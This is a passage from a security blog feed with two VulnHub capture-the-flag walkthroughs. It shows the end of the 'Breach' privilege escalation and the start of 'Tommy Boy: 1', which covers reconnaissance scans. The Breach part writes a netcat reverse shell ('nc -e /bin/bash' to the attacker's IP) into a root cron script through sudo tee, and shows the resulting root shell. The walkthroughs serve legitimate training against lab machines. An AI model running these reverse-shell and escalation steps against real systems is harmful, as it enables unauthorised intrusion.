</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span><span class='line'>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span><span class='line'>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span><span class='line'>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span><span class='line'>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span><span class='line'>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&quot;</span>&gt;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&lt;/a&gt;
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span><span class='line'>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span><span class='line'>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:
</span><span class='line'>syslog:x:101:104::/home/syslog:/bin/false
</span><span class='line'>messagebus:x:102:106::/var/run/dbus:/bin/false
</span><span class='line'>landscape:x:103:109::/var/lib/landscape:/bin/false
</span><span class='line'>milton:x:1000:1000:Milton_Waddams,,,:/home/milton:/bin/bash
</span><span class='line'>tomcat6:x:104:112::/usr/share/tomcat6:/bin/false
</span><span class='line'>colord:x:105:114:colord colour management daemon,,,:/var/lib/colord:/bin/false
</span><span class='line'>mysql:x:106:116:MySQL Server,,,:/nonexistent:/bin/false
</span><span class='line'>blumbergh:x:1001:1001:Bill Lumbergh,,,:/home/blumbergh:/bin/bash
</span></code></pre></td></tr></table></div></figure></p>

<p>Things are getting clear, from the previous notes, I got a string <code>coffeestains</code>, in <code>bill.png</code>, which looks like a password, and now I got Bill&rsquo;s account name is <code>blumbergh</code>.</p>

<p>Now I tried to <code>su</code> to <code>blumbergh</code> with the password <code>coffeestains</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>tomcat6@Breach:/home<span class="nv">$ </span>su blumbergh
</span><span class='line'>su blumbergh
</span><span class='line'>Password: coffeestains&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;blumbergh@Breach:/home<span class="nv">$ </span>id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>blumbergh<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>blumbergh<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>blumbergh<span class="o">)</span>
</span><span class='line'>blumbergh@Breach:/home<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Great! got in!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>blumbergh@Breach:/home<span class="nv">$ </span><span class="nb">cd </span>blumbergh
</span><span class='line'><span class="nb">cd </span>blumbergh
</span><span class='line'>blumbergh@Breach:~<span class="nv">$ </span>ls -al
</span><span class='line'>ls -al
</span><span class='line'>total 28
</span><span class='line'>drwxr-xr-x <span class="m">3</span> blumbergh blumbergh <span class="m">4096</span> Jun <span class="m">12</span> 09:42 .
</span><span class='line'>drwxr-xr-x <span class="m">4</span> root      root      <span class="m">4096</span> Jun  <span class="m">4</span> 19:24 ..
</span><span class='line'>-rw<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>- <span class="m">1</span> blumbergh blumbergh   <span class="m">61</span> Jun <span class="m">12</span> 09:42 .bash_history
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> blumbergh blumbergh  <span class="m">220</span> Jun  <span class="m">4</span> 19:24 .bash_logout
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> blumbergh blumbergh <span class="m">3637</span> Jun  <span class="m">4</span> 19:24 .bashrc
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span> <span class="m">2</span> blumbergh blumbergh <span class="m">4096</span> Jun  <span class="m">6</span> 17:55 .cache
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> blumbergh blumbergh  <span class="m">675</span> Jun  <span class="m">4</span> 19:24 .profile
</span><span class='line'>blumbergh@Breach:~<span class="nv">$ </span>cat .bash_history
</span><span class='line'>cat .bash_history
</span><span class='line'>clear
</span><span class='line'>logoff
</span><span class='line'><span class="nb">logout</span>
</span><span class='line'><span class="nb">exit</span>
</span><span class='line'><span class="nb">cd</span> /usr/share/cleanup
</span><span class='line'>cat tidyup.sh&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;blumbergh@Breach:~<span class="nv">$ </span>locate tidyup.sh
</span><span class='line'>locate tidyup.sh
</span><span class='line'>/usr/share/cleanup/tidyup.sh&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;blumbergh@Breach:~<span class="nv">$ </span>ls -al /usr/share/cleanup/tidyup.sh
</span><span class='line'>ls -al /usr/share/cleanup/tidyup.sh
</span><span class='line'>-rwxr-xr-x <span class="m">1</span> root root <span class="m">289</span> Jun <span class="m">12</span> 09:36 /usr/share/cleanup/tidyup.sh&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;blumbergh@Breach:~<span class="nv">$ </span>cat /usr/share/cleanup/tidyup.sh
</span><span class='line'>cat /usr/share/cleanup/tidyup.sh&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;!/bin/bash&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;Hacker Evasion Script&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;Initech Cyber Consulting, LLC&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;Peter Gibbons and Michael Bolton - 2016&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;This script is <span class="nb">set </span>to run every <span class="m">3</span> minutes as an additional defense measure against hackers.&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;cd /var/lib/tomcat6/webapps <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> find swingline -mindepth <span class="m">1</span> -maxdepth <span class="m">10</span> <span class="p">|</span> xargs rm -rf&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;blumbergh@Breach:~<span class="nv">$ </span>sudo -l
</span><span class='line'>sudo -l
</span><span class='line'>Matching Defaults entries <span class="k">for</span> blumbergh on Breach:
</span><span class='line'>    env_reset, mail_badpass,
</span><span class='line'>    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;User blumbergh may run the following commands on Breach:
</span><span class='line'>    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/tee /usr/share/cleanup/tidyup.sh
</span><span class='line'>blumbergh@Breach:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Here I know that <code>tidyup.sh</code> script will be run automatically every 3 minutes, and <code>blumbergh</code> got ROOT priviledge to run the command <code>/usr/bin/tee /usr/share/cleanup/tidyup.sh</code> which will be able to modify the <code>tidyup.sh</code> script to evil shell.</p>

<p>After setup <code>nc</code> to listen on local port 7777, I run the following command to modify <code>tidyup.sh</code> script to include evil code:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>blumbergh@Breach:~<span class="nv">$ </span><span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>nc -e /bin/bash 192.168.110.129 7777<span class="p">&amp;</span>rdquo<span class="p">;</span> <span class="p">|</span> sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh
</span><span class='line'>tee /usr/share/cleanup/tidyup.sh0.129 7777<span class="err">&quot;</span> <span class="p">|</span> sudo /usr/bin/
</span><span class='line'>nc -e /bin/bash 192.168.110.129 7777
</span><span class='line'>blumbergh@Breach:~<span class="nv">$ </span>cat /usr/share/cleanup/tidyup.sh
</span><span class='line'>cat /usr/share/cleanup/tidyup.sh
</span><span class='line'>nc -e /bin/bash 192.168.110.129 7777
</span></code></pre></td></tr></table></div></figure></p>

<p>Then waiting a few minutes, I got ROOT in !! :D</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -lvnp 7777
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">7777</span> <span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>connect to <span class="o">[</span>192.168.110.129<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.110.140<span class="o">]</span> 45022
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span><span class='line'><span class="nb">cd</span> /root
</span><span class='line'><span class="nb">pwd</span>
</span><span class='line'>/root
</span><span class='line'>ls -la
</span><span class='line'>total 60
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>  <span class="m">4</span> root root  <span class="m">4096</span> Jun <span class="m">12</span> 09:37 .
</span><span class='line'>drwxr-xr-x <span class="m">22</span> root root  <span class="m">4096</span> Jun  <span class="m">4</span> 09:56 ..
</span><span class='line'>-rw<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-  <span class="m">1</span> root root   <span class="m">115</span> Jun <span class="m">12</span> 09:42 .bash_history
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> root root  <span class="m">3106</span> Feb <span class="m">19</span>  <span class="m">2014</span> .bashrc
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>  <span class="m">2</span> root root  <span class="m">4096</span> Jun  <span class="m">6</span> 15:17 .cache
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> root root   <span class="m">840</span> Jun <span class="m">11</span> 17:34 .flag.txt
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> root root <span class="m">23792</span> Jun  <span class="m">4</span> 19:17 flair.jpg
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> root root   <span class="m">140</span> Feb <span class="m">19</span>  <span class="m">2014</span> .profile
</span><span class='line'>drwxr-xr-x  <span class="m">2</span> root root  <span class="m">4096</span> Jun  <span class="m">5</span> 17:51 .rpmdb
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> root root    <span class="m">66</span> Jun  <span class="m">4</span> 19:48 .selected_editor&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h2&gt;cat .flag.txt&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="p">|</span> &lt;strong&gt;&lt;em&gt; <span class="se">\ </span>                  <span class="p">|</span> <span class="p">|</span>   /  <span class="p">|</span> <span class="p">|</span>  _  <span class="p">|</span>    <span class="p">|</span>&lt;/em&gt;   &lt;em&gt;<span class="p">|</span> <span class="p">|</span>        <span class="p">|</span>  &lt;/em&gt;&lt;/strong&gt;<span class="p">|</span>        <span class="p">|</span> <span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="p">|</span>&lt;em&gt;/ /&lt;/em&gt; &lt;strong&gt; &lt;/strong&gt;&lt;em&gt;  &lt;strong&gt; _  &lt;/strong&gt;&lt;/em&gt;<span class="p">|</span> <span class="p">|</span>&lt;strong&gt; &lt;code&gt;<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>/<span class="s1">&#39; |______| | | |__   ___| |__ _ __   __| |</span>
</span><span class='line'><span class="s1">| ___ \ &#39;</span>__/ _ <span class="se">\/</span> _&lt;/code&gt; <span class="p">|</span>/ &lt;/strong&gt;<span class="p">|</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;em&gt; <span class="se">\ </span><span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  /<span class="p">|</span> <span class="p">|</span>&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">&amp;</span>rsquo<span class="p">;</span>&lt;/em&gt; <span class="se">\ </span>/ _ <span class="se">\ </span> &lt;/strong&gt;<span class="p">|</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;em&gt; <span class="se">\ </span>/ &lt;/em&gt;<span class="sb">`</span> <span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="p">|</span>_/ / <span class="p">|</span> <span class="p">|</span>  &lt;/strong&gt;/ <span class="o">(</span>&lt;em&gt;<span class="p">|</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">||</span> <span class="p">|</span>&lt;/em&gt;<span class="se">\ </span><span class="p">|</span>&lt;em&gt;/ /      <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  &lt;strong&gt;/ <span class="p">|</span>&lt;/strong&gt;<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>&lt;/em&gt;<span class="p">|</span> <span class="p">|</span>
</span><span class='line'>_&lt;strong&gt;&lt;em&gt;/<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>  _&lt;/strong&gt;<span class="p">|</span>_&lt;em&gt;,&lt;/em&gt;<span class="p">|</span>_&lt;strong&gt;<span class="p">|</span>&lt;em&gt;<span class="p">|</span> <span class="p">|</span>&lt;/em&gt;_&lt;/strong&gt;<span class="o">(</span>&lt;em&gt;<span class="o">)</span>&lt;/em&gt;&lt;strong&gt;/       _/ <span class="p">|</span>&lt;em&gt;<span class="p">|</span> <span class="p">|</span>&lt;/em&gt;<span class="p">|</span>_&lt;/strong&gt;_&lt;em&gt;&lt;em&gt;&lt;em&gt;/&lt;/em&gt;<span class="p">|</span> <span class="p">|</span>&lt;/em&gt;<span class="p">|</span>_&lt;/em&gt;,_<span class="p">|</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Congrats on reaching the end and thanks <span class="k">for</span> trying out my first <span class="c">#vulnhub boot2root!&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Shout-out to knightmare, and rastamouse <span class="k">for</span> testing and g0tmi1k <span class="k">for</span> hosting.
</span></code></pre></td></tr></table></div></figure></p>

<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[VulnHub] Tommy Boy: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2016/09/13/vulnhub-tommy-boy-1/"/>
    <updated>2016-09-13T07:40:53-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2016/09/13/vulnhub-tommy-boy-1</id>
    <content type="html"><![CDATA[<p>&ldquo;HOLY SCHNIKES! Tommy Boy needs your help!</p>

<p>The Callahan Auto company has finally entered the world of modern technology and stood up a Web server for their customers to use for ordering brake pads.</p>

<p>Unfortunately, the site just went down and the only person with admin credentials is Tom Callahan Sr. - who just passed away! And to make matters worse, the only other guy with knowledge of the server just quit!</p>

<p>You&rsquo;ll need to help Tom Jr., Richard and Michelle get the Web page restored again. Otherwise Callahan Auto will most certainly go out of business :-(&ldquo; &ndash; <a href="https://www.vulnhub.com/author/brian-johnson,256/">Brian Johnson</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/tommy-boy-1,157/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.132/24</em>)</p>

<p>Target: Tommy Boy 1.0 (<em>10.1.1.141/24</em>)</p>

<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://www.thc.org/thc-hydra/">hydra</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.nta-monitor.com/tools/arp-scan/&quot;</span>&gt;http://www.nta-monitor.com/tools/arp-scan/&lt;/a&gt;<span class="o">)</span>
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2    00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>10.1.1.141  00:0c:29:8f:0f:b7   VMware, Inc.
</span><span class='line'>10.1.1.254  00:50:56:f1:c0:1f   VMware, Inc.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;4 packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.363 seconds <span class="o">(</span>108.34 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure></p>

<p><code>10.1.1.141</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/tommyboy1# masscan -p1-65535 10.1.1.141/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span>10000&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2016-09-04 11:29:55 GMT
</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 8008/tcp on 10.1.1.141                                  &lt;br/&gt;
</span><span class='line'>Discovered open port 22/tcp on 10.1.1.141                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.141                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 65534/tcp on 10.1.1.141       &lt;br/&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.141
</span><span class='line'>Host is up <span class="o">(</span>0.00035s latency<span class="o">)</span>.
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span><span class='line'><span class="p">|</span> ssh-hostkey:
</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> a0:ca:62:ce:f6:7e:ae:8b:62:de:0b:db:21:3f:b0:d6 <span class="o">(</span>RSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;em&gt;  <span class="m">256</span> 46:6d:4b:4b:02:86:89:27:28:5c:1d:87:10:55:3d:59 <span class="o">(</span>ECDSA<span class="o">)</span>
</span><span class='line'>80/tcp    open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  Supported Methods: POST OPTIONS GET HEAD
</span><span class='line'><span class="p">|</span> http-robots.txt: <span class="m">4</span> disallowed entries
</span><span class='line'><span class="p">|</span> /6packsofb<span class="p">&amp;</span>hellip<span class="p">;</span>soda /lukeiamyourfather
</span><span class='line'><span class="p">|</span>&lt;em&gt;/lookalivelowbridge /flag-numero-uno.txt
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-title: Welcome to Callahan Auto
</span><span class='line'>8008/tcp  open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  Supported Methods: POST OPTIONS GET HEAD
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-title: KEEP OUT
</span><span class='line'>65534/tcp open  ftp     ProFTPD
</span><span class='line'>MAC Address: 00:0C:29:8F:0F:B7 <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 3.X<span class="p">|</span>4.X
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Based on the result of NMAP scan, firstly, I found OpenSSH 7.2p2 running on port 22, Apache httpd 2.4.18 running on port 80 and 8008 and ProFTPd running on port 65534.</p>

<p>In the meanwhile, I run <code>nikto</code> to scan web vulnerabilities.</p>

<p>Nothing found on port 8008, however, there are some interesting findings from nikto scan on port 80:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>+ Entry <span class="p">&amp;</span>lsquo<span class="p">;</span>/6packsofb<span class="p">&amp;</span>hellip<span class="p">;</span>soda<span class="p">&amp;</span>rsquo<span class="p">;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>301<span class="o">)</span>
</span><span class='line'>+ OSVDB-3268: /lukeiamyourfather/: Directory indexing found.
